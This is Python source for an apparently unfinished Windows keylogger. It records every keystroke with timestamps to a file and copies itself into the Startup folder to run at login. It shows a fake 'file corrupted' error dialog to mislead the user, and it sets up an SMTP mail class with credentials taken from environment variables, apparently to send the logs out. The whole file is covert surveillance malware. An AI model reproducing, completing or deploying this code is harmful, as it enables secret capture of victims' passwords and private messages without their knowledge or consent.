from pynput.keyboard import Key,Listener
import smtplib
from time import asctime,time,localtime
import os
from shutil import copyfile
import ctypes  
class Keyboard:
    def __init__(self):
        self.t=localtime()
        self.current_user=os.getlogin()
        
        #checks if the file already exists in the destination directory !
        self.file_path=f'C:\\Users\\{self.current_user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Whosit.pyw'
        if not os.path.isfile(self.file_path):
            ctypes.windll.user32.MessageBoxW(0, "Error !", "The File Has Been Corrupted !", 1)
            copyfile('./Whosit.pyw',self.file_path)
    def on_press(self,key):
        with open(f'C:\\Users\\USER\\Desktop\\File.txt','a+') as file_name:
            file_name.write(f'{key} pressed {asctime(self.t)}\n')
    def invoke_listener(self):
        with Listener(on_press=self.on_press) as key_listener:
            key_listener.join()
class Mail:
    def __init__(self):
        #the source email credentials !
        self.source_email=os.environ['_EMAIL_']
        self.source_email_pass=os.environ['PASS']
        print(self.source_email)
        #to set the email and password like this.
        #go to env varibales via start menu->Edit Env Varibales->new->Provide the variable name and value !
#key_l=Keyboard()
# key_l.invoke_listener()
emai=Mail()
